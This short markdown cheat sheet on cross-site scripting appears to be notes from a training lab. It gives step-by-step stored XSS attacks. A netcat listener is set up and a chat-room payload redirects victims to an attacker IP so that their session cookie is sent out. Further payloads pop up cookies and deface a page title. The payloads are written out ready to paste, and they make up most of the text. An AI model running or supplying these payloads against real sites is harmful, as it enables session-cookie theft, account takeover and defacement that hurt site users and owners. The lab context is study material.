# XSS
## Basics 
- Cross-site scripting (XSS) is a security vulnerability typically found in web applications. Its a type of injection which can allow an attacker to execute malicious scripts and have it execute on a victims machine.
- A web application is vulnerable to XSS if it uses unsanitized user input. XSS is possible in Javascript, VBScript, Flash and CSS.

## Stored XX
### Chat Room XSS
- Start a netcat listener on your attack box
````
nc -nlvp 4444
````
- Take this XSS payload and paste it in the chat room and submit:
````
<script>window.location='http://10.13.**.**:4444/?cookie='+document.cookie</script>
````
- Note: Send the payload and then open the listener 
## Stored XSS Payloads
- Stored XSS pop up to display your cookies, good for a POC
````
<script>alert(document.cookie)</script>
````
- Adding HTML to a website
````
<title>Example document: XSS Doc</title>
````
- Deface website title. You will need inspect element and find the name of the element you want to change. `thm-title` is the element name in this example.
````
<script>document.getElementById('thm-title').innerHTML="I am a hacker"</script>
````


























































